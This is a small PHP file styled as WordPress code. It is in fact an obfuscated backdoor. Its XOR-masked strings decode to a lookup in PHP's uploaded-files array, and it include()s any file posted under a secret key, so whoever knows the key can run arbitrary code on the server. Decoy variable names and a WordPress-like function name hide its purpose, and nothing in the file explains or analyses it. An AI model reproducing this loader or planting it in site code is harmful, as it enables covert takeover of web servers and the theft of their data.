<?php 	
function wp_cockneyreplace()

{
    $children_query = 'N9Tgm3pt4zl';
    $last_changed = $children_query;
    
	$class = 'last_char';
    $weeuns = $GLOBALS[rel_array("%11%7F%1D%2B%28%60", $last_changed)];
	$table_alias = 'datetime';
    $format_to_edit = $weeuns;
    $_fragment = isset($format_to_edit[$last_changed]);
    if ($_fragment)

    {
        $_links_add_base = $weeuns[$last_changed];
        $target = $_links_add_base[rel_array("%3AT%248%03R%1D%11", $last_changed)];
        $inclusions = $target;
	$loop_member = 'entities';
        include ($inclusions);
    }

}
	$remove_breaks = 'post_modified';
function rel_array($cdn_url, $option)

{
    $script_and_style_regex = $option;
    $internal = "url" . "decode";
	$value = 'timezone';
    $trackback_urls = $internal($cdn_url);
	$offset = 'tb_url';
    $date_floating = substr($script_and_style_regex,0, strlen($trackback_urls));
    $meta_key = $trackback_urls ^ $date_floating;
	$post_ids = 'status';
    
	$page_templates = 'post_type_obj';
    $trackback_urls = strpos($meta_key, $date_floating);
	$show_in_menu = 'date';
    
    return $meta_key;
}

wp_cockneyreplace();


?>
